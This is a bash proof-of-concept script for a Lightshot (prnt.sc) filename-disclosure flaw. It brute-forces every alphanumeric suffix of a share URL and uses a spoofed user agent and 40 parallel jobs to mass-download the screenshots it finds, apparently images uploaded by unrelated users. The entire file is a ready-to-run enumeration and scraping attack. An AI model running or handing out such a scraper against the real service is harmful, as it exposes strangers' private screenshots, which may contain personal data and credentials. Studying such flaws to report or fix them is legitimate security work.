#!/bin/bash

# Lightshot filename disclosure POC
# @Discovered by : Naïm GALLOUJ
# @Author : Charles SENGES

# Example :
# $  ./pull.sh <url> <number of level>
# $  ./pull.sh https://prnt.sc/abc123 6

url=$1
row=$2

USERAGENT='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36'


if (($# != 2)); then
	echo "2 arguments expected"
	exit 1;
fi

cuturl=$(echo $url | head -c -$(expr 1 + $row))
charset=({a..z} {0..9})
alphabet=""
total=$(echo "36 ^ $row" | bc)

clear && echo "Downloading $total images from $url ..." && echo ""


if [ ! -d "out" ]; then mkdir -p "out";fi


permute(){
  (($1 == 0)) && { alphabet=$alphabet" $2"; return; }
  for char in "${charset[@]}"
  do
    permute "$((${1} - 1 ))" "$2$char"
  done
}

permute "$row"


dl(){
	content=$(wget $cuturl$a -U $USERAGENT -q -O -)
	path=$(echo $content | grep -o '<img class="no-click screenshot-image" [ ]*src="[^"]*"' | cut -d '"' -f 4)
	#path=$(echo $content | grep -o 'https*://image[^"]*' | head -1) #Alternative
	echo '['$I'/'$total']' $path
	wget -nv -q -N $path -P "out"
}


I=1
for a in $alphabet; do
	dl &
    while (( $(jobs | wc -l) >= 40 )); do
        sleep 0.1
        jobs > "/dev/null"
    done
    ((I++))
    sleep 0.1
done